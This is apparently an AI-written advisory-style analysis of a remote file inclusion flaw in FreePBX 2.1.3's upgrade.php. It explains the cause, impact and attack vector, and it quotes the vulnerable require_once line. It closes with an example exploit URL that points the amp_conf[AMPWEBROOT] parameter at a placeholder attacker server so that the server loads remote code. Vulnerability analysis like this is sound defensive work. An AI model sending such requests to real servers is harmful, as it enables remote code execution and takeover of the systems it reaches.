Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability is a Remote File Inclusion (RFI) in FreePBX version 2.1.3. The `upgrade.php` script within the application includes a file using a path that is taken from user-supplied input. Specifically the `amp_conf[AMPWEBROOT]` parameter in the HTTP request is used in a `require_once` statement, which allows the attacker to include a remote file.

*   **Weaknesses/Vulnerabilities Present:** The primary weakness is the lack of input sanitization on the `amp_conf[AMPWEBROOT]` parameter. This allows an attacker to control the path used in a `require_once` statement leading to arbitrary code execution.

*   **Impact of Exploitation:** Successful exploitation allows an attacker to include and execute arbitrary code on the server, potentially leading to full system compromise. This could include data theft, malware installation, or complete takeover of the FreePBX system.

*   **Attack Vectors:** The attack vector is through a specially crafted HTTP request to the `upgrade.php` script. The attacker modifies the `amp_conf[AMPWEBROOT]` parameter to point to a malicious file hosted on a server they control.

*   **Required Attacker Capabilities/Position:** The attacker needs to be able to send HTTP requests to the vulnerable FreePBX server. There are no special authentication or prior access requirements specified, therefore any attacker with network access to the server is able to exploit this vulnerability.

**Technical Details:**

*   **Vulnerable File:** `upgrades/2.1beta1/upgrade.php`
*   **Vulnerable Code:** `require_once($amp_conf["AMPWEBROOT"] . "/admin/functions.inc.php");`
*   **Exploit Parameter:** `amp_conf[AMPWEBROOT]`
*   **Example Exploit:** `upgrades/2.1beta1/upgrade.php?amp_conf[AMPWEBROOT]=evilscripts?` (where "evilscripts" is the attacker's remote server hosting malicious code)
